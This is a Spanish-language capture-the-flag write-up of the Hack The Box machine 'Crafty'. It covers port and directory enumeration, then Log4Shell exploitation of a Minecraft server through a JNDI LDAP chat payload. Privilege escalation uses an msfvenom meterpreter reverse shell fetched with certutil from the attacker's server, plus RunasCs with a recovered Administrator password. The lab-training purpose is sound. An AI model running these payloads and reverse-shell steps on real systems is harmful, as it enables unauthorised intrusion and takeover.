---
description: https://app.hackthebox.com/machines/Crafty
---

# 游릴 HTB - Crafty

### Informaci칩n General

<div align="left">

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

</div>

* **Nombre de la M치quina: Crafty**
* **IP de la M치quina:**  10.10.11.249
* **Sistema Operativo: Windows**
* **Dificultad: Easy**
* **Fecha de Publicaci칩n:  10-02-2024**



***

### Enumeraci칩n

#### Ping para obtener ruta de retorno

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n `-R` para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.249 -R
```

#### **Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones `-p-` para escanear todos los puertos, `--open` para mostrar solo los puertos abiertos, `-sS` para un escaneo de tipo TCP SYN, `--min-rate 5000` para establecer la velocidad m칤nima de paquetes y `-vvv` para un nivel de verbosidad alto. Adem치s, utilizamos `-n` para desactivar la resoluci칩n de DNS, `-Pn` para no realizar el escaneo de ping, y `-oG allPorts` para guardar la salida en un archivo con formato Greppable:

{% code overflow="wrap" %}
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.249 -oG allPorts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

**Escaneo detallado con Nmap**

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n `-sCV` para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con `-p __PORTS__` (reemplazando `__PORTS__` con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre `targeted`:

```bash
sudo nmap -sCV -p80,25565 10.10.11.249 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

#### Modificando /etc/hosts

Para a침adir la entrada "10.10.11.249 crafty.htb" al archivo `/etc/hosts`, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP `10.10.11.249` asociada al nombre de host `crafty.htb` al archivo `/etc/hosts` de tu sistema.



#### An치lisis de sitio web con WhatWeb

Para obtener m치s informaci칩n sobre nuestro objetivo, utilizamos la herramienta WhatWeb. Esta herramienta nos permite identificar tecnolog칤as web utilizadas en el servidor, como el sistema de gesti칩n de contenidos (CMS), el lenguaje de programaci칩n, los plugins y otras caracter칤sticas. Ejecutamos el siguiente comando:

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

### Descubrimiento de directorios

\
En la fase de descubrimiento de directorios, se utilizan herramientas como WFuzz y Dirsearch para identificar posibles puntos de entrada o recursos ocultos en el sitio web objetivo.

El comando utilizado fue:

{% code overflow="wrap" %}
```bash
#Partimos con mi favorito dirsearch
dirsearch -u http://crafty.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

#Otro wordlist que vale la pena revisar.
gobuster dir -u http://crafty.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

Lamentablemente no pillo nada util, por lo que entro a la pagina web desde Firefox:

<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

Agregamos la ruta `play.crafty.htb` pero redirecciona asi que no pillamos nada.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>echo "10.10.11.249 play.crafty.htb" | sudo tee -a /etc/hosts
</strong></code></pre>

### Escaneo de Vulnerabilidades

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

Ya cuando se me agotaban las ideas decid칣 instalar Minecraft 1.16.5, ya que curiosamente puse en Google, "Minecraft 1.16.5 exploit" y me encontr칠 con algo interesante.

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

Por lo que decido instalar la version 1.16.5 en mi maquina kali con TLauncher  (hay mejores formas como pyCraft pero ya demasiado tarde lo hice as칤 ):rofl:.\
Investigando Log4J  ([https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc))

```bash
sudo java -jar TLauncher-2.895.jar
```

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

En el README.md de [https://github.com/kozmer/log4j-shel](https://github.com/kozmer/log4j-shell-poc)[l-poc](https://github.com/kozmer/log4j-shell-poc), podemos ver que se necesita descargar una version en espec칤fico de JAVA para el exploit. Por lo que la descargamos en [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).

<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

### Explotaci칩n

Procedemos a ejecutar el exploit,  por cierto modifcamos el poc.py para que sea para windows ("cmd.exe").

```
sudo python3 poc.py --userip 10.10.14.17 --webport 80 --lport 6666
```

Mientras dejamos en escucha nuestro nc al mismo puerto que utilizamos en el exploit. Como dice en el exploit debemos enviar desde el chat de minecraft `${jndi:ldap://10.10.14.17:1389/a}`

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

### Escalada de Privilegios

Como vamos a querer descargar archivos y cosas as칤 no podremos desde esta shell por lo que intentaremos  establecer conexi칩n con una shell hecha por metasploit.

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

Creamos nuestro reverse shell, se llamara expl.exe (por defecto)

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=7777 -f exe -o expl.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Luego desde msfconsole configuramos el metasploit.

<figure><img src="../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

El ultimo paso era subir un servidor Python en el mismo directorio donde teniamos nuestro expl.exe generado por mfsvenom. Para luego descargarlo desde nuestro equipo victima.

{% code overflow="wrap" %}
```bash
certutil -urlcache -f http://10.10.14.17:8888/expl.exe %temp%/expl.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

Ahora si tenemos la capacidad de poder descargar archivos, por lo que descargamos el .jar.

<figure><img src="../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Para abrirlo debemos utilizar jd.gui.

<figure><img src="../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

Nos encontramos con unas credenciales:

```
s67u84zKq8IXw
```

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Seguimos, utilizando RunasCS version 1.5. Para ello lo descargamos de [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs), adem치s tendremos que crear otro expl2.exe con msfvenom:

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Luego desde nuestra sesi칩n de meterpreter subimos nuestro archivo expl2.exe y RunasCs.exe a server/logs:

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

Por ultimo utilizamos nuestro RunasCs.exe utilizando las credenciales que encontramos anteriormente a la vez que tambi칠n lo escuchamos con Metasploit

```
.\RunasCs.exe Administrator s67u84zKq8IXw expl2.exe
```

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

Aqu칤 tenemos la flag del root :tada:

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

### Conclusi칩n

La verdad fue una maquina fuera de lo com칰n, no encontraba nada en el Enumeration, por lo que Googlee un poco y vi que realmente hab칤a que meterse a jugar, y bueno la version del Minecraft ten칤a este exploit y val칤a la pena intentarlo y aprenderlo, buena m치quina para salir de lo cotidiano, adem치s divertido como toc칩 hacer la escala de privilegios, soy muy novato con Metasploit por lo que fue un desafio para mi.

<figure><img src="../../.gitbook/assets/image (182).png" alt="" width="308"><figcaption></figcaption></figure>



### Referencias

{% embed url="https://github.com/antonioCoco/RunasCs" %}

{% embed url="https://github.com/kozmer/log4j-shell-poc" %}

